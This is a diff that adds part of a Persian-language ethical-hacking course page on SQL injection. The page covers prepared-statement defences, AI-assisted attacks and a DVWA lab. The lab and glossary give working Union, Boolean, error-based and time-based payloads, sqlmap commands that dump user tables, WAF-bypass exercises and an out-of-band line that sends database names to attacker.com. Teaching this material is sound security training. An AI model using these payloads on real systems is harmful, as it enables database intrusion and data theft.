+            <li><b>غیرفعال کردن نمایش خطاها:</b> جلوگیری از نمایش پیام‌های خطای پایگاه داده.</li>
+            <li><b>استفاده از WAF:</b> محافظت در برابر حملات.</li>
+            <li><b>به‌روزرسانی منظم:</b> نصب وصله‌های امنیتی.</li>
+            <li><b>آموزش توسعه‌دهندگان:</b> آموزش کدنویسی امن.</li>
+        </ul>
+
+        <h3>📌 مثال Prepared Statements در PHP:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;?php
+$conn = new mysqli($servername, $username, $password, $dbname);
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$username = $_POST['username'];
+$password = $_POST['password'];
+$stmt->execute();
+$result = $stmt->get_result();
+?&gt;</code></pre>
+        </div>
+
+        <h3>📌 مثال Prepared Statements در Python (SQLite):</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>import sqlite3
+conn = sqlite3.connect('database.db')
+cursor = conn.cursor()
+cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> Prepared Statements تنها روش ۱۰۰٪ مؤثر برای جلوگیری از SQL Injection هستند. هرگز ورودی‌های کاربر را مستقیماً در کوئری‌های SQL قرار ندهید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: SQL Injection با هوش مصنوعی -->
+    <!-- ============================================================ -->
+    <div class="card" id="ai-sqli">
+        <h2>🤖 SQL Injection با هوش مصنوعی</h2>
+        <p>
+            CEH v13 به عنوان <b>اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده</b>، به نقش هوش مصنوعی در SQL Injection نیز می‌پردازد.
+        </p>
+
+        <h3>📌 نقش هوش مصنوعی در SQL Injection:</h3>
+        <ul>
+            <li><b>تشخیص خودکار آسیب‌پذیری‌ها:</b> AI می‌تواند کد برنامه را تحلیل کرده و نقاط آسیب‌پذیر را پیدا کند.</li>
+            <li><b>تولید Payloadهای هوشمند:</b> AI می‌تواند payloadهایی تولید کند که از WAF عبور کنند.</li>
+            <li><b>بهینه‌سازی حملات Blind:</b> AI می‌تواند حملات Boolean/Time-based را بهینه‌سازی کند.</li>
+            <li><b>تحلیل خودکار نتایج:</b> AI می‌تواند نتایج حملات را تحلیل کرده و اطلاعات مفید را استخراج کند.</li>
+        </ul>
+
+        <h3>📌 ابزارهای AI-Powered SQL Injection:</h3>
+        <ul>
+            <li><b>AI-Based Vulnerability Scanners:</b> اسکنرهای مبتنی بر AI.</li>
+            <li><b>AI-Powered Payload Generators:</b> تولید payloadهای هوشمند.</li>
+            <li><b>AI-Driven WAF Bypass:</b> دور زدن WAF با AI.</li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 چرا هوش مصنوعی در SQL Injection مهم است؟</b>
+            <p>
+                هوش مصنوعی می‌تواند آسیب‌پذیری‌های SQL Injection را سریع‌تر و دقیق‌تر از روش‌های دستی شناسایی کند و حملات هدفمندتری طراحی کند.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: کارگاه عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="lab-exercise">
+        <h2>🧪 کارگاه عملی – SQL Injection</h2>
+        <p>
+            در این کارگاه، شما با تکنیک‌ها و ابزارهای SQL Injection آشنا خواهید شد و یک سناریوی کامل از حمله SQL Injection را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.
+        </p>
+
+        <h3>🎯 هدف کارگاه:</h3>
+        <ul>
+            <li>شناسایی SQL Injection در یک برنامه وب آسیب‌پذیر.</li>
+            <li>اجرای Union-based SQL Injection.</li>
+            <li>اجرای Blind SQL Injection (Boolean-based و Time-based).</li>
+            <li>استفاده از SQLmap برای خودکارسازی حملات.</li>
+            <li>مقابله با SQL Injection با استفاده از Prepared Statements.</li>
+        </ul>
+
+        <h3>🖥️ محیط مورد نیاز:</h3>
+        <ul>
+            <li><b>حمله‌کننده:</b> Kali Linux</li>
+            <li><b>هدف:</b> DVWA (Damn Vulnerable Web Application) روی Metasploitable 2</li>
+            <li><b>ابزارها:</b> Firefox Developer Tools, SQLmap, Burp Suite (اختیاری)</li>
+        </ul>
+
+        <h3>📝 سناریوی گام‌به‌گام:</h3>
+
+        <h4>مرحله ۱: راه‌اندازی محیط آزمایشگاهی</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># روی Metasploitable 2
+sudo service apache2 start
+
+# دسترسی به DVWA: http://192.168.1.101/dvwa/
+# ورود: admin / password
+# تنظیم Security Level به Low</code></pre>
+        </div>
+
+        <h4>مرحله ۲: شناسایی SQL Injection در صفحه کاربران</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># به صفحه SQL Injection بروید: http://192.168.1.101/dvwa/vulnerabilities/sqli/
+# در کادر ID، یک کاراکتر ' وارد کنید
+# مشاهده خطا: "You have an error in your SQL syntax; ..."
+# این نشان‌دهنده وجود SQL Injection است</code></pre>
+        </div>
+
+        <h4>مرحله ۳: Union-based SQL Injection (دستی)</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># پیدا کردن تعداد ستون‌ها
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+# پیدا کردن ستون‌های قابل نمایش (با UNION SELECT)
+1' UNION SELECT NULL, NULL-- -
+1' UNION SELECT NULL, NULL, NULL-- -
+
+# استخراج نام پایگاه داده
+1' UNION SELECT NULL, database()-- -
+
+# استخراج نام جداول
+1' UNION SELECT table_name, NULL FROM information_schema.tables-- -
+
+# استخراج داده از جدول users
+1' UNION SELECT user, password FROM users-- -</code></pre>
+        </div>
+
+        <h4>مرحله ۴: Blind SQL Injection (Boolean-based)</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># تنظیم Security Level به Medium یا High برای تست Blind
+# تست با شرط True/False
+1' AND 1=1-- -   // صفحه عادی
+1' AND 1=2-- -   // صفحه خالی
+
+# استخراج کاراکتر اول نام پایگاه داده
+1' AND ASCII(SUBSTRING(database(),1,1))=100-- -</code></pre>
+        </div>
+
+        <h4>مرحله ۵: استفاده از SQLmap برای خودکارسازی</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن خودکار (با کوکی)
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"
+
+# استخراج پایگاه‌های داده
+sqlmap -u "..." --cookie="..." --dbs
+
+# استخراج جداول
+sqlmap -u "..." --cookie="..." -D dvwa --tables
+
+# استخراج داده
+sqlmap -u "..." --cookie="..." -D dvwa -T users --dump</code></pre>
+        </div>
+
+        <h4>مرحله ۶: مقابله با SQL Injection</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در کد PHP، استفاده از Prepared Statements
+$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->bind_param("i", $id);
+$stmt->execute();</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <b>⏳ تکلیف:</b> تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند SQL Injection، تشخیص و مقابله تهیه کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۵: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice-exercises">
+        <h2>📝 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه SQL Injection را تقویت کنید.
+        </p>
+
+        <ul>
+            <li>
+                <b>تمرین ۱ – Union-based SQLi:</b>
+                <br>روی DVWA در سطح Low، یک حمله Union-based SQL Injection انجام دهید و اطلاعات جدول users را استخراج کنید.
+            </li>
+            <li>
+                <b>تمرین ۲ – Blind SQLi (Boolean):</b>
+                <br>روی DVWA در سطح Medium، یک حمله Boolean-based Blind SQLi انجام دهید و نام پایگاه داده را پیدا کنید.
+            </li>
+            <li>
+                <b>تمرین ۳ – Blind SQLi (Time):</b>
+                <br>روی DVWA در سطح High، یک حمله Time-based Blind SQLi انجام دهید.
+            </li>
+            <li>
+                <b>تمرین ۴ – SQLmap:</b>
+                <br>با استفاده از SQLmap، یک اسکن کامل روی DVWA انجام دهید و تمام داده‌های پایگاه داده را استخراج کنید.
+            </li>
+            <li>
+                <b>تمرین ۵ – WAF Bypass:</b>
+                <br>یک WAF ساده (مانند ModSecurity) تنظیم کنید و سعی کنید با تکنیک‌های Bypass از آن عبور کنید.
+            </li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۶: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی (Glossary)</h2>
+        <p>
+            در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با <b>ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره</b> توضیح داده شده است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr>
+                    <th style="min-width:130px;">واژه</th>
+                    <th style="min-width:100px;">ساختار / مخفف</th>
+                    <th>تعریف ساده</th>
+                    <th>کاربرد در هک</th>
+                    <th>مثال</th>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SQL Injection</span></td>
+                    <td>SQLi</td>
+                    <td>تزریق کد SQL به ورودی‌های برنامه.</td>
+                    <td>دسترسی به پایگاه داده.</td>
+                    <td><code dir='ltr'>' OR '1'='1</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Union-based SQLi</span></td>
+                    <td>—</td>
+                    <td>استفاده از UNION برای ترکیب نتایج.</td>
+                    <td>استخراج داده از جداول دیگر.</td>
+                    <td><code dir='ltr'>1' UNION SELECT username, password FROM users-- -</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Error-based SQLi</span></td>
+                    <td>—</td>
+                    <td>استفاده از پیام‌های خطا برای استخراج اطلاعات.</td>
+                    <td>نمایش اطلاعات از طریق خطا.</td>
+                    <td><code dir='ltr'>1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Blind SQLi</span></td>
+                    <td>—</td>
+                    <td>استخراج اطلاعات بدون نمایش مستقیم.</td>
+                    <td>زمانی که خطاها و نتایج نمایش داده نمی‌شوند.</td>
+                    <td>Boolean-based, Time-based.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Boolean-based</span></td>
+                    <td>—</td>
+                    <td>استفاده از شرط‌های True/False.</td>
+                    <td>مقایسه پاسخ‌ها برای استخراج اطلاعات.</td>
+                    <td><code dir='ltr'>1' AND 1=1-- -</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Time-based</span></td>
+                    <td>—</td>
+                    <td>استفاده از تأخیر در پاسخ.</td>
+                    <td>بررسی زمان پاسخ برای استخراج اطلاعات.</td>
+                    <td><code dir='ltr'>1' AND SLEEP(5)-- -</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Out-of-band SQLi</span></td>
+                    <td>—</td>
+                    <td>استفاده از کانال دیگر (DNS, HTTP).</td>
+                    <td>زمانی که In-band و Blind ممکن نیستند.</td>
+                    <td><code dir='ltr'>LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Prepared Statement</span></td>
+                    <td>—</td>
+                    <td>کوئری با پارامترهای از پیش تعیین‌شده.</td>
+                    <td>جلوگیری از SQL Injection.</td>
+                    <td><code dir='ltr'>$stmt->prepare("SELECT * FROM users WHERE id = ?")</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">WAF</span></td>
+                    <td><b>W</b>eb <b>A</b>pplication <b>F</b>irewall</td>
+                    <td>فایروال برنامه‌های وب.</td>
+                    <td>محافظت در برابر SQL Injection.</td>
+                    <td>Cloudflare WAF.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SQLmap</span></td>
+                    <td>—</td>
+                    <td>ابزار خودکار SQL Injection.</td>
+                    <td>تشخیص و بهره‌برداری.</td>
+                    <td><code dir='ltr'>sqlmap -u "..." --dbs</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">DVWA</span></td>
+                    <td><b>D</b>amn <b>V</b>ulnerable <b>W</b>eb <b>A</b>pplication</td>
+                    <td>برنامه وب آسیب‌پذیر.</td>
+                    <td>محیط تمرین SQL Injection.</td>
+                    <td>http://192.168.1.101/dvwa/</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Second-Order SQLi</span></td>
+                    <td>—</td>
+                    <td>تزریق در مرحله اول و اجرا در مرحله دوم.</td>
+                    <td>زمانی که payload ذخیره و بعداً اجرا می‌شود.</td>
+                    <td>ثبت نام با username مخرب.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">WAF Bypass</span></td>
+                    <td>—</td>
+                    <td>دور زدن فیلترهای امنیتی.</td>
+                    <td>عبور از WAF با تکنیک‌های مختلف.</td>
+                    <td>URL Encoding, Case Variation.</td>
+                </tr>
+
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۱۵ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی ماژول ۱۵:</b>
+        <p>
+            در این ماژول با یکی از مهم‌ترین و خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب، یعنی <b>SQL Injection</b> آشنا شدید:
+        </p>
+        <ul>
+            <li><b>مفاهیم پایه SQL</b> و نحوه عملکرد کوئری‌ها.</li>
+            <li><b>انواع SQL Injection:</b> In-band (Union-based, Error-based), Blind (Boolean-based, Time-based), Out-of-band.</li>
+            <li><b>روش‌های تشخیص:</b> تست با کاراکترهای ویژه، عبارات منطقی و تأخیر.</li>
+            <li><b>ابزارهای کلیدی:</b> SQLmap, Burp Suite, OWASP ZAP.</li>
+            <li><b>تکنیک‌های پیشرفته:</b> Second-Order, Stored Procedures, DNS Exfiltration.</li>
+            <li><b>دور زدن WAF:</b> URL Encoding, Case Variation, Obfuscation.</li>
+            <li><b>راه‌های مقابله:</b> Prepared Statements, Input Validation, ORM.</li>
+            <li><b>نقش هوش مصنوعی</b> در تشخیص و بهره‌برداری از SQL Injection.</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> در <a href="../Module_16_Hacking_Wireless_Networks/index.html" style="color:#2a7de1;font-weight:bold;">ماژول ۱۶ – Hacking Wireless Networks</a> با تکنیک‌های هک شبکه‌های بی‌سیم و روش‌های مقابله با آنها آشنا خواهید شد.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">ماژول ۱۵ – SQL Injection | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
